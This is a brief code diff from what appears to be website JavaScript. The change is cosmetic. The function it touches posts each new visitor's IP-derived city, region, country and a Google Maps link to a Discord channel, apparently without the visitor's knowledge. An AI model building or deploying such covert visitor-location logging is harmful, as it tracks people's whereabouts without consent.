@@ -23,7 +23,7 @@ function fallbackToIP() {
 
                 // Message for Discord
                 const message = {
-                    content: `# New user on the site\n**IP-based Location:** ${city}, ${region}, ${country}\n[Google Maps Preview](${mapsLink})`
+                    content: `# New user on the site\n**IP-based Location:** ${city}, ${region}, ${country}\n[*Google Maps Preview*](${mapsLink})`
                 };
 
                 sendToDiscord(message);
